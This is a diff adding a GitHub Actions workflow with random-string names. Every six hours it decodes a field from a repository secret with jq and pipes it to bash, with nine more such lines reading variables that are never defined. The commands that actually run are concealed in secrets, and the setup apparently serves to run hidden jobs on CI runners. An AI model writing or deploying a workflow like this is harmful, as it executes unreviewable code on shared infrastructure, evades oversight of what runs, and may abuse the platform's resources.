@@ -1,0 +1,27 @@
+name: whoppingsweatsuit
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: whoppingsweatsuit
+        env:
+          kpqe503: ${{ secrets.kpqe503 }}
+        run: |
+          echo $kpqe503 | jq -r .kunqj7 | /bin/bash
+          echo $kqfy9065 | jq -r .gjo98395 | /bin/bash
+          echo $vhjiu0471 | jq -r .diqm90 | /bin/bash
+          echo $r00245 | jq -r .c82070 | /bin/bash
+          echo $qmkp829 | jq -r .ljc54 | /bin/bash
+          echo $flajh9 | jq -r .yvicj0 | /bin/bash
+          echo $qxfik0 | jq -r .ponjn84110 | /bin/bash
+          echo $vof64206 | jq -r .t023 | /bin/bash
+          echo $d64758 | jq -r .dvz5 | /bin/bash
+          echo $i88 | jq -r .rb323 | /bin/bash
+
